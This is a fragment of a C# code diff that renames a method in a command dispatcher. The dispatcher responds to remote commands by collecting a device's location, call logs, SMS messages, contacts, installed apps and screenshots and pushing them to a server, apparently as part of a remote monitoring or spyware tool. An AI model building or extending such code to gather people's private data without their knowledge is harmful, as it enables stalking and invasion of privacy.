@@ -34,23 +34,23 @@ public sealed class CommandExecutor
                     break;
 
                 case CommandTypes.CaptureLocation:
-                    await _bgService.CollectAndUploadAsync("location", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("location", CancellationToken.None);
                     break;
 
                 case CommandTypes.CaptureCallLogs:
-                    await _bgService.CollectAndUploadAsync("call_logs", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("call_logs", CancellationToken.None);
                     break;
 
                 case CommandTypes.CaptureSms:
-                    await _bgService.CollectAndUploadAsync("sms", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("sms", CancellationToken.None);
                     break;
 
                 case CommandTypes.CaptureContacts:
-                    await _bgService.CollectAndUploadAsync("contacts", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("contacts", CancellationToken.None);
                     break;
 
                 case CommandTypes.CaptureApps:
-                    await _bgService.CollectAndUploadAsync("apps", CancellationToken.None);
+                    await _bgService.DirectCollectAndPushAsync("apps", CancellationToken.None);
                     break;
 
                 case CommandTypes.CaptureScreenshot:
